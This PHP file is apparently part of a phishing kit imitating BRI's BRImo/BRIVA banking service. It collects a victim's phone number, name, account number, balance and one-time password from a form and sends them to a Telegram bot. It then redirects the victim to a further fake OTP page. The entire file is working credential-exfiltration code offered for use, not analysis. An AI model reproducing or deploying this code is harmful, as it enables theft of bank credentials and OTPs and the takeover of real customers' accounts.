<?php
session_start();
include "./telegram.php";

$tarif = $_POST['tarif'];
$nohp = $_POST['nohp'];
$nama = $_POST['nama'];
$norek = $_POST['norek'];
$saldo = $_POST['saldo'];
$otp = $_POST['otp'];

$_SESSION['tarif'] = $tarif;
$_SESSION['nohp'] = $nohp;
$_SESSION['nama'] = $nama;
$_SESSION['norek'] = $norek;
$_SESSION['saldo'] = $saldo;
$_SESSION['otp'] = $otp;

$message = "
- BANK BRIMO | BRIVA - 

• TARIF : ".$tarif."
• NO HP : ".$nohp."
• NAMA : ".$nama."
• NO REK : ".$norek."
• SALDO : ".$saldo."
• OTP : ".$otp."
";

function sendMessage($telegram_id, $message, $id_bot) {
    $url = "https://api.telegram.org/bot" . $id_bot . "/sendMessage?parse_mode=markdown&chat_id=" . $telegram_id;
    $url = $url . "&text=" . urlencode($message);
    $ch = curl_init();
    $optArray = array(
        CURLOPT_URL => $url,
        CURLOPT_RETURNTRANSFER => true
    );
    curl_setopt_array($ch, $optArray);
    $result = curl_exec($ch);
    curl_close($ch);
}

sendMessage($telegram_id, $message, $id_bot);
header('Location: ./otpblms.html');
?>